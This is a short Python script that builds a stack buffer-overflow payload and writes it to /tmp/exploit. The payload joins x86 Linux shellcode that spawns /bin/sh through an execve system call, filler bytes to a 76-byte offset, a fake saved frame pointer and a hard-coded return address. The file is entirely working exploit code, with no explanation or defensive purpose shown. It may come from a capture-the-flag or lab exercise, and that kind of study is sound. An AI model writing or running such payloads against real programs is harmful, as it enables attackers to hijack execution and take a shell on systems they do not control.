import struct

shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)

padding = b"A" * (76 - len(shellcode))
ebp = b"B" * 4
ret = struct.pack("<I", 0x0804a008) 

payload = shellcode + padding + ebp + ret

with open("/tmp/exploit", "wb") as f:
    f.write(payload)